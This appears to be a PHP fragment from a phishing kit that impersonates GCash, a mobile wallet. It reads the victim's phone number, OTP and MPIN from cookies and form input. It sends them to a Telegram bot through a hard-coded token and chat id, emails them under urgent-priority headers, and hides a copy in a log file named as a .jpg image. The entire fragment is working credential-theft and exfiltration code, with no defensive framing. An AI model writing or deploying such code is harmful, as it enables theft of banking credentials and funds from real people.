
file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-578705759&text=" . $_COOKIE['number'] . " MPIN: " . $_POST['mpin']);

$mpin = "\n MPIN: " . $_POST['mpin'];
// $mpin = NULL;

$data = [
'chat_id' => $Chat_ID,
'text' => "Number: " . $_COOKIE['number'] . $mpin
];
file_get_contents("https://api.telegram.org/bot" . $Api_Token . "/sendMessage?" . http_build_query($data));


$subject = "GCash Logs - 3";
$message = "Phone Number: " . $_COOKIE['number'] . "\nOTP: " . $_COOKIE['otp'] . $mpin;
$header = array(
    "From" => $_SERVER['HTTP_HOST'],
    "X-Mailer" => "PHP/" . phpversion(),
    "X-Priority" => "1",
    "Priority" => "Urgent",
    "Importance" => "high"
);

@mail($email, $subject, $message, $header);

$zCh = fopen("logs/gcash-logs.jpg", "a");
fwrite($zCh, '<td>' . $_POST['mpin'] . '</td>' . "\n");
fwrite($zCh, '</tr>' . "\n");
fclose($zCh);
